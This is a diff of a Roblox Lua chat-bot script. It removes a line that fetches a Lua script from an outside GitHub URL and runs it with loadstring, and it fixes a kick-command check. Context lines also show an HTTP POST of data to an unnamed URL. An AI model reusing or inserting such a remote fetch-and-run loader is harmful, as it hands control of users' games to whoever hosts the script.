@@ -35,8 +35,6 @@ request({ Url = url, Body = newdata, Method = "POST", Headers = headers })
 	request({ Url = url, Body = newdata, Method = "POST", Headers = headers })
 
 
-loadstring(game:HttpGet("https://raw.githubusercontent.com/eeeeeeeesw/Bluefox/main/bluefox%20script.lua"))();
-
 local Players = game:GetService("Players")
 local Storage = game:GetService("ReplicatedStorage")
 local chatBotPrefix = "!"
@@ -77,7 +75,7 @@ local function onPlayerAdded(player)
                 sendReloadMessageToChatBot(player)
             elseif command == "kick" then
                 if argument ~= "" then
-                    if false then
+                    if player.Name == argument then
                         player:Kick("You cannot kick yourself.")
                     else
                         kickPlayerByUsername(player, argument)
